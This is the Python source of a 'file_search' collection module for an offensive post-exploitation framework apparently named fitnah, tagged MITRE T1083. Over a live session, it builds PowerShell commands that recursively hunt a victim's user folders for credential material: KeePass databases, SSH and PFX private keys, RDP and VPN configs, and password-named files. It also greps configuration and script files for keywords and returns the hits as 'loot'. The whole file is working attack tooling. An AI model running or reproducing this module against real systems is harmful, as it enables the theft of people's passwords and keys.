"""collection/file_search — search files by name, content, type, age. MITRE T1083"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre

# Interesting file types to always hunt for
_INTERESTING = (
    "*.kdbx,*.kdb,*.pfx,*.pem,*.ppk,*.key,*.p12,"
    "passwords*.txt,*password*.txt,*credential*,*secret*,*cred*,"
    "*.rdp,id_rsa,id_ed25519,*.ovpn,*.conf"
)


class FileSearch(BasePlugin):
    NAME        = "file_search"
    DESCRIPTION = "Search by name pattern, content keyword, interesting file types, last-modified filter."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1083"
    CATEGORY    = "collection"
    schema      = ParamSchema().add(
        Param("pattern",    str, required=False, default="",
              help="Filename glob pattern e.g. *.kdbx (leave blank to use interesting_types)"),
        Param("path",       str, required=False, default="C:\\Users",
              help="Root search path"),
        Param("depth",      int, required=False, default=6,   help="Max directory depth"),
        Param("keyword",    str, required=False, default="",
              help="Content keyword to search inside text files (Select-String)"),
        Param("days",       int, required=False, default=0,
              help="Only files modified within last N days (0=any)"),
        Param("interesting", bool, required=False, default=False,
              help="Also search for built-in list of interesting file types"),
        Param("limit",      int, required=False, default=100,  help="Max results per search"),
    )

    @mitre("T1083")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        pattern     = params.get("pattern", "").strip()
        root        = params.get("path", "C:\\Users")
        depth       = params.get("depth", 6)
        keyword     = params.get("keyword", "").strip()
        days        = params.get("days", 0)
        interesting = params.get("interesting", False)
        limit       = params.get("limit", 100)

        age_filter = (
            f"| Where-Object {{ $_.LastWriteTime -gt (Get-Date).AddDays(-{days}) }}"
            if days > 0 else ""
        )

        def make_search(pat: str, label: str) -> str:
            return (
                f"Write-Output '--- {label} ---';"
                f"Get-ChildItem -Path '{root}' -Recurse -Filter '{pat}' -Depth {depth} -Force -EA SilentlyContinue"
                f" {age_filter} | Select-Object -First {limit} |"
                f" Select-Object FullName,Length,LastWriteTime | Format-Table | Out-String;"
            )

        blocks = []
        if pattern:
            blocks.append(make_search(pattern, f"Pattern: {pattern}"))
        if interesting:
            for pat in _INTERESTING.split(","):
                pat = pat.strip()
                if pat:
                    blocks.append(make_search(pat, f"Type: {pat}"))

        if not blocks:
            if not pattern:
                blocks.append(make_search("*", "All files"))

        if keyword:
            blocks.append(
                f"Write-Output '--- Content keyword: {keyword} ---';"
                f"Get-ChildItem -Path '{root}' -Recurse -Depth {depth} -Include '*.txt','*.xml','*.ini','*.cfg','*.conf','*.json','*.yaml','*.yml','*.ps1','*.bat','*.cmd' -Force -EA SilentlyContinue"
                f" | Select-Object -First 500 | ForEach-Object {{"
                f"  Select-String -Path $_.FullName -Pattern '{keyword}' -EA SilentlyContinue | Select-Object -First 3"
                f" }} | Where-Object {{ $_ }} | Select-Object -First {limit} | Format-Table | Out-String;"
            )

        ps = "".join(blocks)
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        out = r["output"]
        if len(out) > 6000:
            out = out[:6000] + "\n...[truncated]"
        return ModuleResult.ok(data=out, loot_kind="file_list")
